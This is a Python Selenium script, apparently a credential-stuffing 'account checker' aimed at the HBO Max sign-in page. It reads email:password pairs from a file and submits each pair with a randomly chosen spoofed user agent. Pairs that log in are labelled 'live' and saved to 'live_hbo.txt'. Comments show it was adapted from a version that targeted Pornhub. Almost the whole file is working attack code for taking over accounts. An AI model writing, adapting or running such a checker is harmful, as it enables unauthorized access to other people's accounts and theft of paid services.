from selenium import webdriver
from selenium.webdriver.common.by import By
from selenium.webdriver.firefox.options import Options
from selenium.webdriver.support.select import Select
from bs4 import BeautifulSoup
from colorama import Fore, Back, Style
import random 
import time


def main(web,user,password):
	data = password
		
	options = Options()
	options.add_argument('--headless')

	user_agent = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.3",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:91.0) Gecko/20100101 Firefox/91.0",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:91.0) Gecko/20100101 Firefox/91.0",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.1.2 Safari/605.1.15",
    "Mozilla/5.0 (iPhone; CPU iPhone OS 14_7 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.1.2 Mobile/15E148 Safari/604.1",
    "Mozilla/5.0 (Linux; Android 11; Pixel 4) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/92.0.4515.159 Mobile Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/92.0.4515.159 Safari/537.36 Edg/92.0.902.78",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/92.0.4515.159 Safari/537.36 OPR/78.0.4093.184"]
    
	agente = random.choice(user_agent)
	options.set_preference("general.useragent.override", agente)
	#driver = webdriver.Firefox(options=options)
	
	driver = webdriver.Firefox()
	#print(driver.execute_script("return navigator.userAgent;"))
	'<=====================================================>'
	driver.get(web)
	'<=====================================================>'
	time.sleep(7)
	'<=====================================================>'
	username = driver.find_element(By.ID, 'EmailTextInput')
	#pornohub = username / hbo-max = EmailTextInput
	username.send_keys(user)
	'<=====================================================>'
	password = driver.find_element(By.ID, 'PasswordTextInput')#pornohub = password / hbo-max = PasswordTextInput
	password.send_keys(data)
	'<=====================================================>'
	#boton = driver.find_element(By.ID, 'submit')#pornohub
	sign_in_button = driver.find_element(By.CSS_SELECTOR, "div.r-3691iy")
	sign_in_button.click()
	'<=====================================================>'
	time.sleep(7)
	'<=====================================================>'
	page_html = driver.page_source
	soup = BeautifulSoup(page_html, 'html.parser')
	'<=====================================================>'
	#evaluacion = soup.find('span', class_='positionBox')
	evaluacion = soup.find('span', class_= 'css-1qaijid')

	if not evaluacion :
		txt = []
		lives = user+':'+data
		print(Fore.YELLOW + f'cuenta - live [{Fore.GREEN+"@"}{Fore.YELLOW}]: {user} password: {data}')
		
		with open('live_hbo.txt', "+a") as archivo:
				for x in lives:
					txt.append(x.rstrip('\n'))
		
				loc = ''.join(txt)
				archivo.write(loc+'\n')
				archivo.close()
				driver.quit()
	else:
		print(Fore.YELLOW + f'cuenta - dead [{Fore.RED+"X"}{Fore.YELLOW}]: {user} password: {data}')
		driver.quit()
'''sin header'''
#options = Options()
#options.add_argument('--headless')
#driver_s_header = webdriver.Firefox(options=options)

'''con header'''
#driver_c_header = webdriver.Firefox()

open_firefox = input(str('headers (Y)/(N): '))
url_scrapear = "https://play.hbomax.com/signIn"


if open_firefox == 'y' or open_firefox == 'yes':
	#driver_c_header = webdriver.Firefox()
	#main(driver_c_header,url_scrapear)
	pass
	
else:
	data = []
	with open('datos_hbo.txt','r') as f:
		for linea in f:
			v1,v2 = linea.strip().split(':')
			data.append({v1:v2})			
		lineas = len(data)
		for x in range(int(lineas)):
			for datos in zip(data[int(x)].keys(),data[int(x)].values()):
				main(url_scrapear,datos[0],datos[1])